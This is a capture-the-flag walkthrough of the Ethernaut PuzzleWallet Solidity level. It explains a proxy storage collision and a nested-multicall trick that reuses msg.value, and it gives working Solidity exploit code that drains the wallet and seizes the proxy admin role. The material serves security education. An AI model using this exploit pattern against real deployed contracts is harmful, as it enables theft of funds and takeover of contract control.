# Ethernaut Walkthrough: Puzzle-Wallet
## Welcome to KweenBirb's 25th installment of Ethernaut walkthroughs! 

Ethernaut is a set of gamified Solidity challenges in the style of a CTF, where each level features a hackable smart contract that will inform you of various known security vulnerabilities on EVM blockchains.

This repo will walk you through a solution to PuzzleWallet.sol, the 25th challenge in the series. You can find the challenge itself and fully fleshed out solution in the .txt file in the root directory and .sol file in the ./src directory. Let's begin!

In this challenge, Ethernaut describes a transaction-batching collective wallet contract in the form of an upgradeable proxy, using delegatecall to a separate logic implementation contract to perform multiple functions in a single call. Thrifty for gas costs, but of course we know there's a bug :)  We're instructed 'to hijack this wallet to become the admin of the proxy.'

This challenge presents us with a lengthier codebase than in previous challenges, so let's start by working backwards. Our objective is to find a security hole that lets us assume the admin role, so first we search for a function that updates the admin.

```
function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
}
```

Okay, that's not very helpful. Only the current admin can call this function that updates the contract's new admin. So to become admin we have to... be the admin? There's an external proposeNewAdmin() function that will set the storage address pendingAdmin to an address of our choosing, but that still won't help us.

In checking the contract state (using Foundry since Ethernaut only lets us interface with the wallet):

```cast call --rpc-url $RPC $PROXY "pendingAdmin():(address)"```

and

```cast call --rpc-url $RPC $PROXY "admin():(address)"```

We can see the admin variable was already set by the constructor. Drat. Let's inspect the logic implementation contract instead, then.

The logic implementation has a storage address owner and storage uint256 maxBalance.  Perhaps we need to become owner first? That takes us to the init() function, which requires the logic implementation's contract to be 0:

```
function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
}
```

Maybe the maxBalance variable wasn't properly initialized when the logic implementation was deployed? Proxy contract constructors are notoriously tough to keep track of... Let's check (using Ethernaut's web3js wrapper):

```await contract.maxBalance()```

That's interesting... Unfortunately it's not the 0 that we were hoping for in order to call init() and assume ownership. However, it's the same hexadecimal 'uint' as the address returned when we checked the storage state variables in the proxy contract... Oh man is there a storage collision!?

## Be careful with proxies!

Yep, check it out! Because of mismatched storage layouts, the maxBalance storage variable reads/writes from the admin storage variable. On further examination, these values match both pendingAdmin and admin storage values as well! Seeing as we can affect the variables from the same storage slot we should be able to do some weird shit...

Conveniently for us, the only function in the proxy contract that can be called without invoking the onlyAdmin() modifier is one to propose a pendingAdmin. Lo and behold, pendingAdmin is the slot being read from to return the owner. This means we can call proposeNewAdmin() to assume ownership of the wallet contract. 

It's not full admin priveleges, but what a perfect foot in the door to maneuver deeper into the access control roles of the contract!

## Let's pwn this shit!

First we need to set pendingAdmin to a malicious contract we control so that we can pass the addToWhitelist() require check that reads from the owner/pendingAdmin storage slot. Easiest way to claim ownership ever, I guess!

```
function sharingStorageIsntCaring() public {
    // become owner aka pendingAdmin lol
    instance.proposeNewAdmin(address(this)); 
}
```

Okay, that was easy. Next we add ourselves to the whitelist:

```     
// become whitelisted via pwnership
instanceWallet.addToWhitelist(address(this));
```

Here comes the tricky part: we have to find a way to call the function setMaxBalance() in order to become the admin of the proxy, but it is blocking us from doing so because the contract possesses a small balance of Eth:

```require(address(this).balance == 0, "Contract balance is not 0");```

Just 0.001 ether standing in the way of KweenBirb's ascension to KweenAdministrator. This, compounded with the fact that execute(), the function that handles ether withdrawals, also appears to block any way for us to gain control of these funds:

```require(balances[msg.sender] >= value, "Insufficient balance");```

But the multicall() function just below execute() looks really juicy as it accepts a bytes[] array parameter and we know from Ethernaut's Alien Codex level that strange things can occur when you accept byte parameters; especially when there's a delegatecall in the mix!

On closer examination, we see a for loop structure that first checks for the bytes4(sha3()) function selector for this contract's deposit() method. Shit! That keeps us from calling deposit twice to reuse msg.value via delegatecall's preservation of msg.value context:

```
bytes4 selector;
assembly {
    selector := mload(add(_data, 32))
}
if (selector == this.deposit.selector) {
    require(!depositCalled, "Deposit can only be called once");
    // Protect against reusing msg.value
    depositCalled = true;
}
```

But multicall()'s entire purpose is to wrap multiple other function calls into one transaction, so why don't we trick the above logic by wrapping our second deposit() call into yet another multicall()? This should let us bypass the selector check above using something like this: 

```multicall('deposit()', multicall('deposit()'))```

The check will only see the multicall selector when it reaches the second index in the byte array, then go on to execute a second deposit() and spoof msg.value, raising our balance above what we actually sent. To do so, we craft a specific payload doing exactly that:

```     
// drain victim proxy contract balance to 0
bytes[] memory data = new bytes[](3);
bytes[] memory nestedData = new bytes[](1);
data[0] = bytes(abi.encodeWithSignature("deposit()"));
nestedData[0] = data[0];
data[1] = bytes(abi.encodeWithSignature("multicall(bytes[])", nestedData));
data[2] = bytes(abi.encodeWithSignature(
        "execute(address,uint256,bytes)", 
        address(0x0000000000000000000000000000000000000000), 
        0.002 ether, 
        'KweenBirb just pwnd u LOL'
        ));
instanceWallet.multicall{ value: 0.001 ether }(data);
```

You'll notice I included the execute() call that dumps the 0.002 ether to the burn address and taunts... well nobody in particular since it's an internal transaction to the burn address and nobody reads those. But KweenBirb does, and KweenBirb did, and it makes KweenBirb chuckle! Anyway, moving on: all that's left to do is ascend to KweenAdministrator. 

--note: In case you aren't familiar, ascension to Queen Administrator (descension, really) is a reference to Wildbow's flagship masterwork: "Worm"  If you like web serials, superhero sci-fi/fantasy genre, and haven't read it, go now and start it. You won't be disappointed!

```
// become admin by setting maxBalance (aka admin) to KweenBirbhaxxz0r LOL
instanceWallet.setMaxBalance(uint256(uint160(hacker)));
```

Bam. That's our pwn function in a bugshell. Deploy, destroy, and enjoy!

Congratulations on defeating the Worm by gaining administrative access to the ever-untapped power well of social coordination. Long live Khepri.

h00t h00t
